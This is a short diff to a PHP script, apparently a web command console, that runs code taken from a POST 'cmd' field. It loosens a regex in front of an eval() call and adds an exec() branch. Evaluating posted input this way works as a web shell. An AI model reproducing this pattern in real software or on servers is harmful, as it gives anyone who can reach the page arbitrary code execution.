@@ -51,7 +51,7 @@ foreach ($paths as $path) {
 
 if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] == 'POST')
     if (isset($_POST['cmd']) && $_POST['cmd'] != '')
-        if (preg_match('/^php\s+(:?(.*))/i', $_POST['cmd'], $match)) {
+        if (preg_match('/^php\s*(:?.*)/i', $_POST['cmd'], $match)) {
             if (preg_match('/^php\s+(?!(-r))/i', $_POST['cmd'])) {
                 $match[1] = trim($match[1], '"');
                 $output[] = eval ($match[1] . (substr($match[1], -1) != ';' ? ';' : ''));
@@ -79,6 +79,11 @@ if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] == 'POST')
                     }
                 }
                 //$output[] = $_POST['cmd'];
+            } else {
+                $_POST['cmd'] = 'php -v';
+
+                exec($_POST['cmd'], $output);
+
             }
 
             if (isset($output) && is_array($output)) {
